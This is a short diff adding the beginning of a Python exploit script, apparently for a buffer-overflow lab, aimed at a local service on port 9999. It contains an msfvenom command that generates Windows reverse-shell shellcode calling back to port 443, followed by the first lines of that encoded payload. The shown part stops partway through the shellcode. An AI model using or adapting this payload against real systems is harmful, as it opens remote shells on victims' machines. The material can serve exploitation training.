@@ -1,0 +1,12 @@
+import socket
+import time
+
+host = "127.0.0.1"
+port = 9999
+
+# msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -f py -b "\x00\x0a" -v shellcode
+shellcode =  b""
+shellcode += b"\xba\xb1\xae\x95\x57\xdb\xdd\xd9\x74\x24"
+shellcode += b"\xf4\x5e\x33\xc9\xb1\x31\x83\xc6\x04\x31"
+shellcode += b"\x56\x0f\x03\x56\x8e\xe4\x29\x9b\x8f\x82"
+shellcode += b"\x5f\x8c\x82\x2b\x82\x5b\x5b\x7f\x4d\x8d"
